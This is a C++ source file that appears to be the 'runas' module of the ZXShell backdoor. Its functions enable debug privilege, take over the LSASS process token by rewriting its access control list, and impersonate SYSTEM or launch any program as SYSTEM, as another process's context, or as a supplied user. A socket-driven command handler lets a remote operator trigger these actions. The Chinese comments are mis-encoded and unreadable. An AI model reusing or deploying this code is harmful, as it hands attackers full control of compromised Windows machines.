#include "..\zxsCommon\zxsWinAPI.h"
#include "runas.h"
#include "..\zxsCommon\debugoutput.h"


_CImpersonateSystem::_CImpersonateSystem()
{
	::ImpersonateSystem();
}

_CImpersonateSystem::~_CImpersonateSystem()
{
	ZXSAPI::RevertToSelf();
}


BOOL GetProcessUser(HANDLE hProc, TCHAR *szDomainName, TCHAR *szUserName, DWORD nNameLen)
{
	BOOL fResult  = FALSE;
	HANDLE hToken = NULL;
	TOKEN_USER *pTokenUser = NULL;
	
	__try
	{

        fResult = ZXSAPI::OpenProcessToken(hProc, TOKEN_QUERY, &hToken);
        if(!fResult)  
		{
			__leave;
		}
		
		DWORD dwNeedLen = 0;		
		fResult = GetTokenInformation(hToken,TokenUser, NULL, 0, &dwNeedLen);
		if (dwNeedLen > 0)
		{
			pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
			fResult = GetTokenInformation(hToken,TokenUser, pTokenUser, dwNeedLen, &dwNeedLen);
			if (!fResult)
			{
				__leave;
			}
		}
		else
		{
			__leave;
		}

		SID_NAME_USE sn;
		DWORD dwDmLen = MAX_PATH;
		fResult = ZXSAPI::LookupAccountSid(NULL, pTokenUser->User.Sid, szUserName, &nNameLen,
			szDomainName, &dwDmLen, &sn);
	}
	__finally
	{
		if (hToken)
			::CloseHandle(hToken);
		if (pTokenUser)
			delete[] (char*)pTokenUser;

		return fResult;
	}
}

BOOL CALLBACK callbackEnumVisibleWndProc(HWND hwnd, LPARAM lParam)
{

	if(IsWindowVisible(hwnd))
		*(BOOL*)lParam = TRUE;

	return TRUE;
}

BOOL HaveVisibleWnd(DWORD pid)
{
	HANDLE m_hThreadSnap = NULL;
	THREADENTRY32 m_te32;
	memset(&m_te32,0,sizeof(m_te32));
	m_te32.dwSize = sizeof(THREADENTRY32);
	m_hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
	WNDENUMPROC lpFun = callbackEnumVisibleWndProc;
	BOOL IsHas = FALSE;

	if (Thread32First(m_hThreadSnap, &m_te32))
	{
		do
		{
			 if (pid == m_te32.th32OwnerProcessID)
			 {
				  EnumThreadWindows(m_te32.th32ThreadID,
				   lpFun,
				   (LPARAM)&IsHas);//ö�������̴߳���HWND

				  if(IsHas)
					  break;
			 }
		}
		while (Thread32Next(m_hThreadSnap,&m_te32));
	}
    CloseHandle( m_hThreadSnap );

	return IsHas;
}

DWORD GetProcessId( LPCTSTR szProcName )
{
  PROCESSENTRY32 pe;  
  DWORD dwPid;
  DWORD dwRet;
  BOOL bFound = FALSE;

  //
  // ͨ�� TOOHLP32 ����ö�ٽ���
  //

  HANDLE hSP =  ZXSAPI::CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
  if ( hSP )
  {
    pe.dwSize = sizeof( pe );

    for ( dwRet = Process32First( hSP, &pe );
          dwRet;
          dwRet = Process32Next( hSP, &pe ) )
    {
      //
      // ʹ�� StrCmpNI �Ƚ��ַ������ɺ��Դ�Сд
      //
      if ( stricmp( szProcName, pe.szExeFile ) == 0 )
      {
        dwPid = pe.th32ProcessID;
        bFound = TRUE;
        break;
      }
    }

    CloseHandle( hSP );

    if ( bFound == TRUE )
    {
      return dwPid;
    }
  }

  return NULL;
}



BOOL AMISYSTEM()
{
	TCHAR szUserName[MAX_PATH]="\0",szDomainName[MAX_PATH]="\0";
	
	if(!GetProcessUser(
		ZXSAPI::GetCurrentProcess(),
		szDomainName,
		szUserName,
		MAX_PATH)
		)
		return FALSE;

	return stricmp(szUserName, "SYSTEM") == 0;
}

DWORD GetPIDBySessionId(LPCTSTR szProcName, DWORD sessionid)
{
	PROCESSENTRY32 pe;  
	DWORD dwPid, dwSessionId;
	DWORD dwRet;
	BOOL bFound = FALSE;

	//
	// ͨ�� TOOHLP32 ����ö�ٽ���
	//

	HANDLE hSP =  ZXSAPI::CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if ( hSP )
	{
		pe.dwSize = sizeof( pe );

		for ( dwRet = Process32First( hSP, &pe );
			  dwRet;
			  dwRet = Process32Next( hSP, &pe ) )
		{

			if(ProcessIdToSessionId(pe.th32ProcessID, &dwSessionId))
			{
				if(dwSessionId == sessionid)
				{
					if ( stricmp( szProcName, pe.szExeFile ) == 0 )
					{
						dwPid = pe.th32ProcessID;
						bFound = TRUE;
						break;
					}
				}
			}

		}

		CloseHandle( hSP );

		if ( bFound == TRUE )
		{
		  return dwPid;
		}
	}

	return 0;
}

BOOL AdjustTokenSessionId(HANDLE *lphToken, int flag)
{
	HANDLE myToken = NULL,hNewToken = NULL;
	DWORD TokenInformation, myTI;
	DWORD RetLen;
	BOOL bResult;

	bool bAmISYSTEM = AMISYSTEM();

	if(bAmISYSTEM && flag == 0)
	{
		return TRUE;
	}

	bResult = GetTokenInformation(*lphToken, 
		TokenSessionId, 
		&TokenInformation, 
		sizeof(DWORD), 
		&RetLen);

	if(!bResult)
		return FALSE;

	bResult = ZXSAPI::OpenProcessToken(ZXSAPI::GetCurrentProcess(), TOKEN_QUERY, &myToken);

	if(!bResult)
		return FALSE;

	bResult = GetTokenInformation(myToken, 
		TokenSessionId, 
		&myTI, 
		sizeof(DWORD), 
		&RetLen);

	CloseHandle(myToken);

	DebugPrivilege("SeTcbPrivilege", TRUE);

	if ( !ZXSAPI::DuplicateTokenEx( *lphToken,
	  TOKEN_ALL_ACCESS,
	  NULL,
	  SecurityImpersonation,
	  TokenPrimary,
	  &hNewToken ) )
	{
		__printf( "DuplicateTokenEx() = %d\n", GetLastError() );   

		return bResult;
	}

	CloseHandle(*lphToken);

	*lphToken = hNewToken;

	bResult = ZXSAPI::SetTokenInformation(hNewToken, TokenSessionId, &myTI, sizeof(DWORD));

	return bResult;
}

BOOL _CreateProcessAsPid(DWORD dwPid, TCHAR *lpProcessName, int RunInThisSession, TCHAR *lpDesktop, LPPROCESS_INFORMATION lppi)
{
	BOOL ret = 0;
	HANDLE hProcess = NULL;
	HANDLE hOldToken = NULL, hToken = NULL, hNewToken = NULL, hThreadToken=NULL;
	PSECURITY_DESCRIPTOR pOldSD = NULL;

	hProcess = ZXSAPI::OpenProcess( PROCESS_QUERY_INFORMATION, FALSE, dwPid );
	if ( hProcess == NULL )
	{
		__printf( "OpenProcess() = %d\n", GetLastError() );   
		goto Cleanup;
	}

	if ( !ZXSAPI::OpenProcessToken( hProcess, READ_CONTROL|WRITE_DAC, &hOldToken ) )
	{
		__printf( "OpenProcessToken() = %d\n", GetLastError() );

		goto Cleanup;
	}


	if ( !ModifySecurity(hOldToken,
						   TOKEN_ALL_ACCESS,
						   &pOldSD))
	{
		__printf( "ModifySecurity() error\n");

		goto Cleanup;
	}


	if ( !ZXSAPI::OpenProcessToken( hProcess, TOKEN_ALL_ACCESS, &hToken ) )
	{
		__printf( "OpenProcessToken() = %d\n", GetLastError() );

		goto Cleanup;
	}

	AdjustTokenSessionId(&hToken, RunInThisSession);

	ResetSecurity(hOldToken, pOldSD);

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof( STARTUPINFO ) );
	si.cb = sizeof( STARTUPINFO );
	si.lpDesktop = lpDesktop;

	if ( !ZXSAPI::CreateProcessAsUser(hToken,
							 NULL,
							 lpProcessName,
							 NULL,
							 NULL,
							 FALSE,
							 NULL, //NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
							 NULL,
							 NULL,
							 &si,
							 &pi ) )
	{
		__printf( "CreateProcessAsUser() = %d\n", GetLastError() );   

		goto Cleanup;
	}else
	{
		if(lppi)
		{
			memcpy(lppi, &pi, sizeof(pi));
		}else
		{
			CloseHandle( pi.hProcess );
			CloseHandle( pi.hThread );
		}
	}

	ret++;

Cleanup:

	if (hOldToken != NULL) CloseHandle(hOldToken);
	if (hToken != NULL) CloseHandle(hToken);
	if (hThreadToken != NULL) CloseHandle(hThreadToken);
	if (hNewToken != NULL) CloseHandle(hNewToken);
	if (hProcess != NULL) CloseHandle(hProcess);
	CheckAndLocalFree(pOldSD);


	return ret;
}

BOOL RunAsUser(TCHAR *lpzUser, TCHAR *lpPassword, TCHAR *lpProcessName)
{
	BOOL ret;
	HANDLE hToken = NULL;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof( STARTUPINFO ) );
	si.cb = sizeof( STARTUPINFO );

	if(!ImpersonateSystem())
	{
		__printf( "ImpersonateSystem() to failed!\n" );

		return FALSE;
	}

	ret = LogonUser(lpzUser,
	NULL,
	lpPassword,
	LOGON32_LOGON_INTERACTIVE,
	LOGON32_PROVIDER_DEFAULT,
	&hToken);


	if(ret)
	{
		ret = ZXSAPI::CreateProcessAsUser(hToken,
								 NULL,
								 lpProcessName,
								 NULL,
								 NULL,
								 FALSE,
								 NULL, //NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
								 NULL,
								 NULL,
								 &si,
								 &pi );
		if(!ret)
		{
			__printf( "CreateProcessAsUser() = %d\n", GetLastError() );   

		}else
		{
			CloseHandle( pi.hProcess );
			CloseHandle( pi.hThread );
		}
	}

	if(hToken)
		CloseHandle(hToken);

	ZXSAPI::RevertToSelf();//!!!

	return ret;
}


BOOL RunAsPid(DWORD dwPid, TCHAR *lpProcessName)
{
	BOOL ret;

	if(!ImpersonateSystem())
	{
		__printf( "ImpersonateSystem() to failed!\n" );

		return FALSE;
	}

	ret = _CreateProcessAsPid(dwPid, lpProcessName, 1, "winsta0\\default");

	ZXSAPI::RevertToSelf();//!!!

	return ret;
}


BOOL ImpersonateSystem()
{
   HANDLE hProc = NULL;
   HANDLE hToken = NULL;
   HANDLE hOldToken = NULL;
   HANDLE hNewToken = NULL;
   PSECURITY_DESCRIPTOR pOldSD = NULL;
   DWORD SystemPID;
   BOOL fResult;

   BOOL ret = FALSE;

	if(!DebugPrivilege(SE_DEBUG_NAME, TRUE))
	{
	__printf( "EnableDebugPriv() to failed!\n" );

	return FALSE;
	}

	__try
   {  

	  //
	  // ѡ�� SYSTEM ����
	  //

	  if ( ( SystemPID = GetProcessId( "LSASS.EXE" ) ) == NULL )
	  {
		__printf( "GetProcessId() to failed!\n" );   

		__leave;
	  }

      hProc = ZXSAPI::OpenProcess(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION,//PROCESS_ALL_ACCESS
                          FALSE,
                          SystemPID);
      if (!hProc)     
      {
         __printf(_T("OpenProcess failed with %d.\n"), GetLastError());
         __leave;
      }

      //
      // Open the process token with this access
      // so that we can modify the DACL and add
      // TOKEN_DUPLICATE & TOKEN_ASSIGN_PRIMARY
      // rights for this user
      //
      fResult = ZXSAPI::OpenProcessToken(hProc,
                                 READ_CONTROL|WRITE_DAC,
                                 &hOldToken);
      if (!fResult)
      {
         __printf(_T("OpenProcessToken failed with %d.\n"), GetLastError());
         __leave;
      }
      
      fResult = ModifySecurity(hOldToken,
                               TOKEN_ALL_ACCESS,
                               &pOldSD);
      if (!fResult)
      {
         __leave;
      }
            
      fResult = ZXSAPI::OpenProcessToken(hProc,
                                 TOKEN_ALL_ACCESS,
                                 &hToken);
      if (!fResult)
      {
         __printf(_T("OpenProcessToken failed with %d.\n"), GetLastError());
         __leave;
      }

	  if ( !ZXSAPI::DuplicateTokenEx( hToken,
		  TOKEN_ALL_ACCESS,
		  NULL,
		  SecurityImpersonation,
		  TokenPrimary,
		  &hNewToken ) )
	  {
		  __printf( "DuplicateTokenEx() = %d\n", GetLastError() );   

		  __leave;
	  }

	  ZXSAPI::ImpersonateLoggedOnUser( hNewToken );

      ResetSecurity(hOldToken, pOldSD);

	  ret = TRUE;
   }
   __finally
   {
	  DebugPrivilege(SE_DEBUG_NAME, FALSE);
	  if (hProc != NULL) CloseHandle(hProc);
      if (hToken != NULL) CloseHandle(hToken);      
      if (hOldToken != NULL) CloseHandle(hOldToken);
      if (hNewToken != NULL) CloseHandle(hNewToken);
      CheckAndLocalFree(pOldSD);
	  return ret;
   }

   return ret;
}

BOOL ModifySecurity(HANDLE hToken, DWORD dwAccess, PSECURITY_DESCRIPTOR *pOldSD)
{
   PSECURITY_DESCRIPTOR pSD = NULL;
   PSECURITY_DESCRIPTOR pAbsSD = NULL; 
   PACL pNewAcl = NULL;
   DWORD dwAclSize = 0, dwSaclSize = 0;
   DWORD dwSidOwnLen = 0, dwSidPrimLen = 0;
   DWORD dwSDLength = 0;
   DWORD dwSDLengthNeeded;
   EXPLICIT_ACCESS explicitaccess;   
   DWORD dwResult;
   PACL pAcl;   
   PACL pacl;   
   BOOL fDaclPresent,fDaclDefaulted;
   BOOL fResult;
   BOOL fReturn = FALSE;

   __try
   {
      explicitaccess.Trustee.ptstrName = NULL;

      // Get size of security descriptor
      fResult = GetKernelObjectSecurity(hToken,
                                        DACL_SECURITY_INFORMATION,
                                        NULL,
                                        0,
                                        &dwSDLengthNeeded);
      if (!fResult)
      {
         if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
         {
            // Allocate memory for security descriptor
            pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSDLengthNeeded);
            if (!pSD)
            {
               __printf(_T("Unable to allocate memory for security descriptor.\n"));
               __leave;
            }

            *pOldSD = pSD;

            // Get Security Descriptor from token
            fResult = GetKernelObjectSecurity(hToken,
                                        DACL_SECURITY_INFORMATION,
                                        pSD,
                                        dwSDLengthNeeded,
                                        &dwSDLengthNeeded);
            if (!fResult)
            {
               __printf(_T("GetKernelObjectSecurity failed with %d.\n"), GetLastError());
               __leave;
            }            
         }
         else
         {
            __printf(_T("GetKernelObjectSecurity failed with %d.\n"), GetLastError());
            __leave;
         }
      }

      // Get pointer to the DACL
      fResult = GetSecurityDescriptorDacl(pSD,
                                          &fDaclPresent,
                                          &pAcl,
                                          &fDaclDefaulted);
      if (!fResult)
      {
         __printf(_T("GetSecurityDescriptorDacl failed with %d.\n"), GetLastError());
         __leave;
      }
      
      // Build Administrators EXPLICIT_ACCESS Structure
      fResult = BuildAdministratorsExplicitAccess(&explicitaccess, dwAccess);
      if (!fResult)
      {
         __leave;
      }
      
      // Add the entry to the ACL
      dwResult = SetEntriesInAcl(1,
                                 &explicitaccess,
                                 pAcl,
                                 &pNewAcl);
      if (dwResult != ERROR_SUCCESS)
      {
         __printf(_T("SetEntriesInAcl failed with %d.\n"), GetLastError());
         __leave;
      }
      
      // Get Sizes for Absolute Security Descriptor
      // We only need dwSDLength and dwAclSize.
      // The SACL, SID owner, and SID primary group
      // are not present.
      fResult = MakeAbsoluteSD(pSD, 
                               NULL, 
                               &dwSDLength,
                               NULL, 
                               &dwAclSize,
                               NULL, 
                               &dwSaclSize,
                               NULL, 
                               &dwSidOwnLen,
                               NULL, 
                               &dwSidPrimLen);
      if (!fResult)
      {
         if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
         {
            // Allocate memory for absolute Security Descriptor
            pAbsSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSDLength);
            if (!pAbsSD)
            {
               __printf(_T("Unable to allocate memory for Absolute SID.\n"));
               __leave;
            }

            // Allocate memory for DACL
            pacl = (PACL)LocalAlloc(LPTR, dwAclSize);
            if (!pacl)
            {
               __printf(_T("Unable to allocate memory for DACL.\n"));
               __leave;
            }
         }
         else
         {
            __printf(_T("MakeAbsoluteSD failed with %d.\n"), GetLastError());
            __leave;
         }
      }

      // Create absolute Security Descriptor
      fResult = MakeAbsoluteSD(pSD, 
                               pAbsSD, 
                               &dwSDLength,
                               pacl, 
                               &dwAclSize,
                               NULL, 
                               &dwSaclSize,
                               NULL, 
                               &dwSidOwnLen,
                               NULL, 
                               &dwSidPrimLen);
      if (!fResult)
      {
         __printf(_T("MakeAbsoluteSD failed with %d.\n"), GetLastError());
         __leave;
      }

      // Add the new DACL to the SD
      fResult = SetSecurityDescriptorDacl(pAbsSD,
                                          fDaclPresent,
                                          pNewAcl,
                                          fDaclDefaulted);
      if (!fResult)
      {
         __printf(_T("SetSecurityDescriptorDacl failed with %d.\n"), GetLastError());
         __leave;
      }

      // Add the new SD to the token
      fResult = SetKernelObjectSecurity(hToken,
                                        DACL_SECURITY_INFORMATION,
                                        pAbsSD);
      if (!fResult)
      {
         __printf(_T("SetKernelObjectSecurity failed with %d.\n"), GetLastError());
         __leave;
      }

      fReturn = TRUE;
   }
   __finally
   {
      // Cleanup
      if (explicitaccess.Trustee.ptstrName != NULL) 
      {
         FreeSid(explicitaccess.Trustee.ptstrName);
      }     
      CheckAndLocalFree(pAbsSD);
      CheckAndLocalFree(pacl);
      CheckAndLocalFree(pNewAcl);
      if (!fReturn)
      {
         CheckAndLocalFree(pSD);
         *pOldSD = NULL;
      }
   }

   return fReturn;
}

BOOL BuildAdministratorsExplicitAccess(EXPLICIT_ACCESS *pExplicitAccess, DWORD dwAccess)
{
   SID_IDENTIFIER_AUTHORITY SystemSidAuthority = SECURITY_NT_AUTHORITY; 
   PSID pSid = NULL;   
   BOOL fResult;

   // Create "Administrators" SID
   fResult = AllocateAndInitializeSid(&SystemSidAuthority, 
                                       2, 
                                       SECURITY_BUILTIN_DOMAIN_RID, 
                                       DOMAIN_ALIAS_RID_ADMINS,
                                       0, 
                                       0, 
                                       0, 
                                       0, 
                                       0, 
                                       0, 
                                       &pSid);
   if (!fResult)
   {
      __printf(_T("AllocateAndInitializeSid failed with %d.\n"), GetLastError());
      return FALSE;
   }

   pExplicitAccess->grfAccessMode = GRANT_ACCESS;
   pExplicitAccess->grfAccessPermissions = dwAccess;
   pExplicitAccess->grfInheritance = 0;
   
   // Build the Trustee with the SID
   BuildTrusteeWithSid(&(pExplicitAccess->Trustee), pSid);

   return TRUE;   
}

/*
void __cdecl MyPrintf(LPCTSTR lpszFormat, ...)
{
   TCHAR szOutput[2048];
   va_list v1 = NULL;
   HRESULT hr = S_OK;

   va_start(v1, lpszFormat);
   hr = _snprintf(szOutput, sizeof(szOutput), lpszFormat, v1);
   if (SUCCEEDED(hr))
   {
      OutputDebugString(szOutput);
      __printf(szOutput);
   }
   else
   {
      __printf(_T("StringCbVPrintf failed with %X\n"), hr);
   }
}
*/

BOOL ResetSecurity(HANDLE hToken, PSECURITY_DESCRIPTOR pSD)
{   
   BOOL fResult;

   // Add the new SD to the token
   fResult = SetKernelObjectSecurity(hToken,
                                     DACL_SECURITY_INFORMATION,
                                     pSD);
   if (!fResult)
   {
      __printf(_T("SetKernelObjectSecurity failed with %d.\n"), GetLastError());
      return FALSE;
   }

   return TRUE;
}


BOOL __ImpersonateSystem()
{
  HANDLE hProcess = NULL;
  HANDLE hToken = NULL, hNewToken = NULL;
  DWORD dwPid;

  PACL pOldDAcl = NULL;
  PACL pNewDAcl = NULL;
  BOOL bDAcl;
  BOOL bDefDAcl;
  DWORD dwRet;

  PACL pSacl = NULL;
  PSID pSidOwner = NULL;
  PSID pSidPrimary = NULL;
  DWORD dwAclSize = 0;
  DWORD dwSaclSize = 0;
  DWORD dwSidOwnLen = 0;
  DWORD dwSidPrimLen = 0;

  DWORD dwSDLen;
  EXPLICIT_ACCESS ea;
  PSECURITY_DESCRIPTOR pOrigSd = NULL;
  PSECURITY_DESCRIPTOR pNewSd = NULL;

  STARTUPINFO si;
  PROCESS_INFORMATION pi;

  BOOL bError = FALSE;

  if(!DebugPrivilege(SE_DEBUG_NAME, TRUE))
  {
    __printf( "EnableDebugPriv() to failed!\n" );

    bError = TRUE;
    goto Cleanup;
  }
 
  //
  // ѡ�� SYSTEM ����
  //

  if ( ( dwPid = GetProcessId( "LSASS.EXE" ) ) == NULL )
  {
	__printf( "GetProcessId() to failed!\n" );   

	bError = TRUE;
	goto Cleanup;
  }


  hProcess = OpenProcess( PROCESS_QUERY_INFORMATION, FALSE, dwPid );
  if ( hProcess == NULL )
  {
    //__printf( "OpenProcess() = %d\n", GetLastError() );   
    bError = TRUE;
    goto Cleanup;
  }

  if ( !OpenProcessToken( hProcess, READ_CONTROL | WRITE_DAC, &hToken ) )
  {
    __printf( "OpenProcessToken() = %d\n", GetLastError() );

    bError = TRUE;
    goto Cleanup;
  }

  //
  // ���� ACE �������з���Ȩ��
  //
  ZeroMemory( &ea, sizeof( EXPLICIT_ACCESS ) );
  BuildExplicitAccessWithName( &ea,
                               "administrators",
                               TOKEN_ALL_ACCESS,
                               GRANT_ACCESS,
                               0 );

  if ( !GetKernelObjectSecurity( hToken,
                                 DACL_SECURITY_INFORMATION,
                                 pOrigSd,
                                 0,
                                 &dwSDLen ) )
  {
    //
    // ��һ�ε��ø����Ĳ����϶��������������������Ŀ����
    // Ϊ�˵õ�ԭ��ȫ������ pOrigSd �ĳ���
    //
    if ( GetLastError() == ERROR_INSUFFICIENT_BUFFER )
    {
      pOrigSd = ( PSECURITY_DESCRIPTOR ) HeapAlloc( GetProcessHeap(),
                                                    HEAP_ZERO_MEMORY,
                                                    dwSDLen );
      if ( pOrigSd == NULL )
      {
        __printf( "Allocate pSd memory to failed!\n" );

        bError = TRUE;
        goto Cleanup;
      }

      //
      // �ٴε��ò���ȷ�õ���ȫ������ pOrigSd
      //
      if ( !GetKernelObjectSecurity( hToken,
                                     DACL_SECURITY_INFORMATION,
                                     pOrigSd,
                                     dwSDLen,
                                     &dwSDLen ) )
      {
        __printf( "GetKernelObjectSecurity() = %d\n", GetLastError() );
        bError = TRUE;
        goto Cleanup;
      }
    }
    else
    {
      __printf( "GetKernelObjectSecurity() = %d\n", GetLastError() );
      bError = TRUE;
      goto Cleanup;
    }
  }

  //
  // �õ�ԭ��ȫ�������ķ��ʿ����б� ACL
  //
  if ( !GetSecurityDescriptorDacl( pOrigSd, &bDAcl, &pOldDAcl, &bDefDAcl ) )
  {
    __printf( "GetSecurityDescriptorDacl() = %d\n", GetLastError() );

    bError = TRUE;
    goto Cleanup;
  }

  //
  // ������ ACE Ȩ�޵ķ��ʿ����б� ACL
  //
  dwRet = SetEntriesInAcl( 1, &ea, pOldDAcl, &pNewDAcl ); 
  if ( dwRet != ERROR_SUCCESS )
  {
    __printf( "SetEntriesInAcl() = %d\n", GetLastError() ); 
    pNewDAcl = NULL;

    bError = TRUE;
    goto Cleanup;
  } 

  if ( !MakeAbsoluteSD( pOrigSd,
                        pNewSd,
                        &dwSDLen,
                        pOldDAcl,
                        &dwAclSize,
                        pSacl,
                        &dwSaclSize,
                        pSidOwner,
                        &dwSidOwnLen,
                        pSidPrimary,
                        &dwSidPrimLen ) )
  {
    //
    // ��һ�ε��ø����Ĳ����϶��������������������Ŀ����
    // Ϊ�˴����µİ�ȫ������ pNewSd ���õ�����ĳ���
    //
    if ( GetLastError() == ERROR_INSUFFICIENT_BUFFER )
    {
      pOldDAcl = ( PACL ) HeapAlloc( GetProcessHeap(),
                                     HEAP_ZERO_MEMORY,
                                     dwAclSize );
      pSacl = ( PACL ) HeapAlloc( GetProcessHeap(),
                                  HEAP_ZERO_MEMORY,
                                  dwSaclSize );
      pSidOwner = ( PSID ) HeapAlloc( GetProcessHeap(),
                                      HEAP_ZERO_MEMORY,
                                      dwSidOwnLen );
      pSidPrimary = ( PSID ) HeapAlloc( GetProcessHeap(),
                                        HEAP_ZERO_MEMORY,
                                        dwSidPrimLen );
      pNewSd = ( PSECURITY_DESCRIPTOR ) HeapAlloc( GetProcessHeap(),
                                                   HEAP_ZERO_MEMORY,
                                                   dwSDLen );

      if ( pOldDAcl == NULL ||
           pSacl == NULL ||
           pSidOwner == NULL ||
           pSidPrimary == NULL ||
           pNewSd == NULL )
      {
        __printf( "Allocate SID or ACL to failed!\n" );

        bError = TRUE;
        goto Cleanup;
      }

      //
      // �ٴε��òſ��Գɹ������µİ�ȫ������ pNewSd
      // ���µİ�ȫ��������Ȼ��ԭ���ʿ����б� ACL
      //
      if ( !MakeAbsoluteSD( pOrigSd,
                            pNewSd,
                            &dwSDLen,
                            pOldDAcl,
                            &dwAclSize,
                            pSacl,
                            &dwSaclSize,
                            pSidOwner,
                            &dwSidOwnLen,
                            pSidPrimary,
                            &dwSidPrimLen ) )
      {
        __printf( "MakeAbsoluteSD() = %d\n", GetLastError() );

        bError = TRUE;
        goto Cleanup;
      }
    }
    else
    {
      __printf( "MakeAbsoluteSD() = %d\n", GetLastError() );

      bError = TRUE;
      goto Cleanup;
    }
  }

  //
  // ���������з���Ȩ�޵ķ��ʿ����б� pNewDAcl ���뵽�µ�
  // ��ȫ������ pNewSd ��
  //
  if ( !SetSecurityDescriptorDacl( pNewSd, bDAcl, pNewDAcl, bDefDAcl ) )
  {
    __printf( "SetSecurityDescriptorDacl() = %d\n", GetLastError() );

    bError = TRUE;
    goto Cleanup;
  }
  //����µ�SecurityDescriptor�Ƿ�Ϸ�
  if(!IsValidSecurityDescriptor(pNewSd))
  {
    __printf("pSecurityDescriptor1 is not a valid SD:%d\n",GetLastError());
    bError = TRUE;
    goto Cleanup;
  }
  //
  // ���µİ�ȫ�������ӵ� TOKEN ��
  //
  if ( !SetKernelObjectSecurity( hToken, DACL_SECURITY_INFORMATION, pNewSd ) )
  {
    __printf( "SetKernelObjectSecurity() = %d\n", GetLastError() );

    bError = TRUE;
    goto Cleanup;
  }

  //
  // �ٴδ� SYSTEM ���̵� TOKEN����ʱ�Ѿ��������з���Ȩ��
  //

  CloseHandle(hToken);
  hToken = NULL;
  if ( !OpenProcessToken( hProcess, TOKEN_ALL_ACCESS, &hToken ) )
  {
    __printf( "OpenProcessToken() = %d\n", GetLastError() );   

    bError = TRUE;
    goto Cleanup;
  }

  //
  // ����һ�ݾ�����ͬ����Ȩ�޵� TOKEN
  //
  if ( !DuplicateTokenEx( hToken,
                          TOKEN_ALL_ACCESS,
                          NULL,
                          SecurityImpersonation,
                          TokenPrimary,
                          &hNewToken ) )
  {
    __printf( "DuplicateTokenEx() = %d\n", GetLastError() );   

    bError = TRUE;
    goto Cleanup;
  }


  ZeroMemory( &si, sizeof( STARTUPINFO ) );
  si.cb = sizeof( STARTUPINFO );

  //
  // �������½�û��Ļ��������½��̻���ʾ
  // 1314 �ͻ�û���������Ȩ����
  //
  ImpersonateLoggedOnUser( hNewToken );


  bError = FALSE;

Cleanup:
  if ( pOrigSd )
  {
	SetKernelObjectSecurity( hToken, DACL_SECURITY_INFORMATION, pOrigSd );
    HeapFree( GetProcessHeap(), 0, pOrigSd );
  }
  if ( pNewSd )
  {
    HeapFree( GetProcessHeap(), 0, pNewSd );
  }
  if ( pSidPrimary )
  {
    HeapFree( GetProcessHeap(), 0, pSidPrimary );
  }
  if ( pSidOwner )
  {
    HeapFree( GetProcessHeap(), 0, pSidOwner );
  }
  if ( pSacl )
  {
    HeapFree( GetProcessHeap(), 0, pSacl );
  }
  if ( pOldDAcl )
  {
    HeapFree( GetProcessHeap(), 0, pOldDAcl );
  }

  //RevertToSelf();
  DebugPrivilege(SE_DEBUG_NAME, FALSE);

  CloseHandle( hToken );
  CloseHandle( hNewToken );
  CloseHandle( hProcess );

  if ( bError )
  {
    return FALSE;
  }

  return TRUE;
}



#if defined _ZXSHELL

int RunAs(MainPara *args)
{
	SPAMFUNCTION 
		
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;

	if(argc < 2)
	{
		SendMessage(Socket, 
			"DESCRIPTION:\r\n"
			"    Create new process as another User or Process context.\r\n\r\n"
			"USAGE: runas <PID> ExeFile\r\n"
			"       runas test.exe      (run test.exe with the context of lsass.exe default.)\r\n"
			"       runas 724 test.exe  (run test.exe with the context of specified pid.)\r\n"
			"       runas user password test.exe  (run test.exe as user)\r\n"
			);
		return 0;
	}

	BOOL bError;
	if(argc == 2)
		bError = RunAsPid(GetProcessId("LSASS.EXE"), argv[1]);
	else if(argc == 3)
		bError = RunAsPid(atoi(argv[1]), argv[2]);
	else if(argc == 4)
	{
		bError = RunAsUser(argv[1], argv[2], argv[3]);
	}
	if(bError)
		SendMessage(Socket, "The New Process Created Successfully.\r\n");
	else
		SendMessage(Socket, "Faild.\r\n");

	ZXSAPI::RevertToSelf();//!!!
	return bError;
}


#endif